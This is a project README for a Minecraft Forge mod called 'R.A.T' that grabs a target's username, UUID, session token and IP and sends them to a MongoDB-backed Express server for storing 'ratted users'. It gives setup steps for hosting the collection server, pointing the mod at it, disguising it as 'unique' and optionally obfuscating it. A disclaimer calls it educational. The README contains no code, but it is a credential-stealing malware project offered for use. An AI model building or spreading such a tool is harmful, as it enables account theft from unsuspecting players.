<div align="center">

# R.A.T

<img src="https://bigrat.monster/media/bigrat.png" alt="logo" width="25%" />

**Retrieve Access Token**

</div>

## Features
- Grabs the **username, uuid, token and ip** of a target as a *JSON*.
- JavaScript Backend server which:
  - Checks if the token is valid before adding to the database.
  - Checks if all fields in the json are present.
  
  therefore filtering out spam requests.

- Can be easily be hosted on *Heroku*.

- Uses:
  - *MongoDB* for for storing ratted users.
  - *Express* for the backend server.

## Setup
- Server
  1. Clone the repository.
  2. Install dependencies.
  3. Create a .env file with your database url.
  3. Run the server (don't forget to change some strings).

- Mod
  1. Follow [1.8.9ForgeTemplate#setup](https://github.com/DxxxxY/1.8.9ForgeTemplate#setup) to setup your mod environment.
  2. Change url to your server and change some other stuff to make it ✨unique✨.
  3. Build the mod.
  4. (Optional) Obfuscate the mod.

## Disclaimer
This is for educational purposes only. I am not responsible for any damage caused by this tool.

## License
GPLv3 © dxxxxy